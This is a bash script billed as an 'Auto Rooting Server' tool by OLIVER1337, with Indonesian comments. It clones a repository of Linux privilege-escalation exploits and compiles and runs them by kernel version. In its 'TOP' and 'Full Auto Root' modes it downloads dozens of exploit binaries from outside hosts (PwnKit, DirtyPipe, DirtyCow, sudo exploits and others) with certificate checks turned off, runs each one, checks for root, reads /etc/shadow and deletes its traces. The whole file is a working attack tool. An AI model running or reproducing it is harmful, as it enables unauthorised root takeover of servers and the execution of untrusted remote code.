#!/bin/bash

RED='\033[91m'
ENDCOLOR='\033[0m'

echo "***************************************************************"
echo -e "${RED}Auto Rooting Server By: OLIVER1337${ENDCOLOR}"
echo -e "${RED}GROUP : 303${ENDCOLOR}"
echo "***************************************************************"

# Cek dependensi utama
command -v gcc >/dev/null 2>&1 || { echo "[!] Gcc not found. Exiting."; exit 1; }
command -v git >/dev/null 2>&1 || { echo "[!] Git not found. Exiting."; exit 1; }

# Periksa wget atau curl
DOWNLOAD_CMD=""
if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget -q --no-check-certificate"
elif command -v curl >/dev/null 2>&1; then
    DOWNLOAD_CMD="curl -s -O -k"
else
    echo "[!] Neither wget nor curl found. Exiting."
    exit 1
fi

clear
echo "==================================================="
echo "              Auto Root Exploit"
echo "               by OliverSecurity"
echo "==================================================="
echo "[x] Your Kernel: $(uname -r)"
echo ""

KERNEL_VERSION=$(uname -r | cut -d. -f1)

if [ "$KERNEL_VERSION" = "2" ]; then
    localroot=1
elif [ "$KERNEL_VERSION" = "3" ]; then
    localroot=2
elif [ "$KERNEL_VERSION" = "4" ]; then
    localroot=3
elif [ "$KERNEL_VERSION" = "5" ]; then
    localroot=4
else
    echo "[x] Kernel tidak dikenali, menampilkan menu manual..."
    echo "[1] Kernel 2.x"
    echo "[2] Kernel 3.x"
    echo "[3] Kernel 4.x"
    echo "[4] Kernel 5.x"
    echo "[5] TOP Exploit Root"
    echo "[6] Gunakan Folder Exploit"
    echo "[7] Auto Root Full Mode (OLIVER1337)"
    read -p "Pilih opsi manual: " localroot
fi

# Clone repository ke folder /tmp
tmpdir="/tmp/Linux-Privilege-Escalation-Exploits"
rm -rf "$tmpdir"
git clone https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits.git "$tmpdir" >/dev/null 2>&1

run_exploit() {
    src="$1"
    bin="$2"
    cd "$tmpdir/$src" 2>/dev/null || return
    echo "[+] Compile $src"
    gcc *.c -o "$bin" && chmod +x "$bin" && ./"$bin"
}

# Kernel 2.x
if [ "$localroot" = "1" ]; then
    run_exploit "2004/caps_to_root" "exploit"
    run_exploit "2004/CVE-2004-1235" "exploit"
    run_exploit "2006/CVE-2006-2451" "exploit"
    run_exploit "2016/CVE-2016-5195/exp-1" "dirty"
fi

# Kernel 3.x
if [ "$localroot" = "2" ]; then
    run_exploit "2014/CVE-2014-3153/exp-1" "exploit"
    run_exploit "2015/CVE-2015-1328" "exploit"
    run_exploit "2016/CVE-2016-0728" "exploit"
    run_exploit "2016/CVE-2016-9793" "exploit"
    run_exploit "2017/CVE-2017-7308" "exploit"
fi

# Kernel 4.x
if [ "$localroot" = "3" ]; then
    run_exploit "2016/CVE-2016-8655" "exploit"
    run_exploit "2017/CVE-2017-6074" "exploit"
    run_exploit "2017/CVE-2017-16995" "exploit"
    run_exploit "2018/CVE-2018-5333" "exploit"
    run_exploit "2019/CVE-2019-13272" "exploit"
fi

# Kernel 5.x
if [ "$localroot" = "4" ]; then
    run_exploit "2019/CVE-2019-15666" "exploit"
    run_exploit "2020/CVE-2020-8835" "exploit"
    run_exploit "2021/CVE-2021-22555/exp-2" "exploit"
    run_exploit "2022/CVE20220847/exp-1" "exp"
fi

# TOP Exploit
if [ "$localroot" = "5" ]; then
    $DOWNLOAD_CMD https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
    gcc exploit.c -o exploit && ./exploit && rm -f exploit exploit.c
    $DOWNLOAD_CMD https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
    chmod +x PwnKit && ./PwnKit && rm -f PwnKit
    $DOWNLOAD_CMD https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
    chmod +x exploit.sh && bash exploit.sh && rm -f exploit.sh
fi

# Gunakan folder eksploit
if [ "$localroot" = "6" ]; then
    echo "[+] Silakan gunakan manual folder di: $tmpdir"
    ls "$tmpdir"
    exit 0
fi

# Auto Root Full Mode - OLIVER1337
if [ "$localroot" = "7" ]; then
    echo "[+] Starting Full Auto Root (OLIVER1337)..."
    tmpfile=$(mktemp /tmp/batosayroot.XXXXXX.sh)
    cat << 'EOF' > $tmpfile
#!/bin/bash

RED='\033[91m'
ENDCOLOR='\033[0m'

echo "***************************************************************"
echo -e "${RED}Auto Rooting Server By: OLIVER1337${ENDCOLOR}"
echo -e "${RED}GROUP : 303${ENDCOLOR}"
echo "***************************************************************"

check_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo
        echo "Successfully Get Root Access"
        echo "ID     => $(id -u)"
        echo "WHOAMI => $USER"
        echo
        exit
    fi
}

check_pkexec_version() {
    output=$(pkexec --version)
    version=""
    while IFS= read -r line; do
        if [[ $line == *"pkexec version"* ]]; then
            version=$(echo "$line" | awk '{print $NF}')
            break
        fi
    done <<< "$output"
    echo "$version"
}

run_commands_with_pkexec() {
    pkexec_version=$(check_pkexec_version)
    echo "pkexec version: $pkexec_version"

    if [[ $pkexec_version == "1.05" || $pkexec_version == "0.96" || $pkexec_version == "0.95" || $pkexec_version == "105" ]]; then
        wget -q "https://0-gram.github.io/id-0/exp_file_credential" --no-check-certificate
        chmod 777 exp_file_credential
        ./exp_file_credential
        check_root
        rm -f exp_file_credential
        rm -rf exp_dir
    else
        echo "pkexec not supported"
    fi
}

run_commands_with_pkexec

# pwnki / pkexec
wget -q "https://0-gram.github.io/id-0/ak" --no-check-certificate
chmod 777 ak
./ak
check_root
rm -f ak
rm -rf GCONV_PATH=.
rm -rf .pkexec

# ptrace
wget -q "https://0-gram.github.io/id-0/ptrace" --no-check-certificate
chmod 777 ptrace
./ptrace
check_root
rm -f ptrace

# CVE-2022-0847-DirtyPipe-Exploits
wget -q "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-1" --no-check-certificate
wget -q "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-2" --no-check-certificate
chmod 777 exploit-1
chmod 777 exploit-2
./exploit-1
./exploit-2 SUID
check_root
rm -f exploit-1
rm -f exploit-2

# lupa:v
wget -q "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out" --no-check-certificate
chmod 777 a2.out
find / -perm 4000 -type -f 2>/dev/null || find / -perm -u=s -type -f 2>/dev/null
./a2.out /usr/bin/sudo
check_root
./a2.out /usr/bin/passwd
check_root
rm -f a2.out

wget -q "https://0-gram.github.io/id-0/sudodirtypipe" --no-check-certificate
chmod 777 "sudodirtypipe"
./sudodirtypipe /usr/local/bin
check_root
rm "sudodirtypipe"

wget -q "https://0-gram.github.io/id-0/af_packet" --no-check-certificate
chmod 777 "af_packet"
./af_packet
check_root
rm "af_packet"

wget -q "https://0-gram.github.io/id-0/CVE-2015-1328" --no-check-certificate
chmod 777 "CVE-2015-1328"
./CVE-2015-1328
check_root
rm "CVE-2015-1328"

wget -q "https://0-gram.github.io/id-0/cve-2017-16995" --no-check-certificate
chmod 777 "cve-2017-16995"
./cve-2017-16995
check_root
rm "cve-2017-16995"

wget -q "https://0-gram.github.io/id-0/exploit-debian" --no-check-certificate
chmod 777 "exploit-debian"
./exploit-debian
check_root
rm "exploit-debian"

wget -q "https://0-gram.github.io/id-0/exploit-ubuntu" --no-check-certificate
chmod 777 "exploit-ubuntu"
./exploit-ubuntu
check_root
rm "exploit-ubuntu"

wget -q "https://0-gram.github.io/id-0/newpid" --no-check-certificate
chmod 777 "newpid"
./newpid
check_root
rm "newpid"

wget -q "https://0-gram.github.io/id-0/raceabrt" --no-check-certificate
chmod 777 "raceabrt"
./raceabrt
check_root
rm "raceabrt"

wget -q "https://0-gram.github.io/id-0/timeoutpwn" --no-check-certificate
chmod 777 "timeoutpwn"
./timeoutpwn
check_root
rm "timeoutpwn"

wget -q "https://0-gram.github.io/id-0/upstream44" --no-check-certificate
chmod 777 "upstream44"
./upstream44
check_root
rm "upstream44"

wget -q "https://0-gram.github.io/id-0/lpe.sh" --no-check-certificate
chmod 777 "lpe.sh"
head -2 /etc/shadow
./lpe.sh
check_root
rm "lpe.sh"

wget -q "https://0-gram.github.io/id-0/a.out" --no-check-certificate
chmod 777 "a.out"
./a.out 0 && ./a.out 1
check_root
rm "a.out"

wget -q "https://0-gram.github.io/id-0/linux_sudo_cve-2017-1000367" --no-check-certificate
chmod 777 "linux_sudo_cve-2017-1000367"
./linux_sudo_cve-2017-1000367
check_root
rm "linux_sudo_cve-2017-1000367"

wget -q "https://0-gram.github.io/id-0/overlayfs" --no-check-certificate
chmod 777 "overlayfs"
./overlayfs
check_root
rm "overlayfs"

wget -q "https://0-gram.github.io/id-0/CVE-2017-7308" --no-check-certificate
chmod 777 "CVE-2017-7308"
./CVE-2017-7308
check_root
rm "CVE-2017-7308"

wget -q "https://0-gram.github.io/id-0/CVE-2022-2639" --no-check-certificate
chmod 777 "CVE-2022-2639"
./CVE-2022-2639
check_root
rm "CVE-2022-2639"

wget -q "https://0-gram.github.io/id-0/polkit-pwnage" --no-check-certificate
chmod 777 "polkit-pwnage"
./polkit-pwnage
check_root
rm "polkit-pwnage"

wget -q "https://0-gram.github.io/id-0/RationalLove" --no-check-certificate
chmod 777 "RationalLove"
./RationalLove
check_root
rm "RationalLove"

wget -q "https://0-gram.github.io/id-0/CVE-2011-1485" --no-check-certificate
chmod 777 "CVE-2011-1485"
./CVE-2011-1485
check_root
rm "CVE-2011-1485"

wget -q "https://0-gram.github.io/id-0/CVE-2012-0056" --no-check-certificate
chmod 777 "CVE-2012-0056"
./CVE-2012-0056
check_root
rm "CVE-2012-0056"

wget -q "https://0-gram.github.io/id-0/CVE-2014-4014" --no-check-certificate
chmod 777 "CVE-2014-4014"
./CVE-2014-4014
check_root
rm "CVE-2014-4014"

wget -q "https://0-gram.github.io/id-0/CVE-2016-9793" --no-check-certificate
chmod 777 "CVE-2016-9793"
./CVE-2016-9793
check_root
rm "CVE-2016-9793"

wget -q "https://0-gram.github.io/id-0/CVE-2021-3493" --no-check-certificate
chmod 777 "CVE-2021-3493"
./CVE-2021-3493
check_root
rm "CVE-2021-3493"

wget -q "https://0-gram.github.io/id-0/CVE-2023-32233" --no-check-certificate
chmod 777 "CVE-2023-32233"
./CVE-2023-32233
check_root
rm "CVE-2023-32233"

wget -q "https://0-gram.github.io/id-0/FreeBSD-2005-EDB-ID-1311" --no-check-certificate
chmod 777 "FreeBSD-2005-EDB-ID-1311"
./FreeBSD-2005-EDB-ID-1311
check_root
rm "FreeBSD-2005-EDB-ID-1311"

wget -q "https://0-gram.github.io/id-0/chocobo_root" --no-check-certificate
chmod 777 "chocobo_root"
./chocobo_root
check_root
rm "chocobo_root"

wget -q "https://0-gram.github.io/id-0/cowroot" --no-check-certificate
chmod 777 "cowroot"
./cowroot
check_root
rm "cowroot"

wget -q "https://0-gram.github.io/id-0/dcow" --no-check-certificate
chmod 777 "dcow"
./dcow
check_root
rm "dcow"

wget -q "https://0-gram.github.io/id-0/dirtycow" --no-check-certificate
chmod 777 "dirtycow"
./dirtycow
check_root
rm "dirtycow"

wget -q "https://0-gram.github.io/id-0/exp" --no-check-certificate
chmod 777 "exp"
./exp
check_root
rm "exp"

wget -q "https://0-gram.github.io/id-0/makman" --no-check-certificate
chmod 777 "makman"
./makman
check_root
rm "makman"

wget -q "https://0-gram.github.io/id-0/pwn" --no-check-certificate
chmod 777 "pwn"
./pwn
check_root
rm "pwn"

wget -q "https://0-gram.github.io/id-0/socat" --no-check-certificate
chmod 777 "socat"
./socat
check_root
rm "socat"

wget -q "https://0-gram.github.io/id-0/sudo_pwfeedback" --no-check-certificate
chmod 777 "sudo_pwfeedback"
./sudo_pwfeedback
check_root
rm "sudo_pwfeedback"

wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" --no-check-certificate
chmod 777 "exploit_userspec.py"
python2 exploit_userspec.py
check_root
rm "exploit_userspec.py"
rm "0"
rm "kmem"
rm "sendfile1"

wget -q "https://raw.githubusercontent.com/CallMeBatosay/Privilege-Escalation/main/sudo-hax-me-a-sandwich" --no-check-certificate
chmod 777 "sudo-hax-me-a-sandwich"
./sudo-hax-me-a-sandwich 0
check_root
./sudo-hax-me-a-sandwich 1
check_root
./sudo-hax-me-a-sandwich 2
check_root
rm "sudo-hax-me-a-sandwich"

wget -q "https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh" --no-check-certificate
chmod 777 "exploit.sh"
check_root
rm "exploit.sh"


echo "TERIMAKASI TELAH MENGGUNAKAN TOOLS KAMI"
echo "TOOLS INI AKAN DI HAPUS DARI WEB"
echo "AGAR TOOLS SAYA TETAP AMAN TIDAK DI CURI"
rm "root.sh"

EOF
    chmod +x $tmpfile
    bash $tmpfile
    rm -f $tmpfile
    exit
fi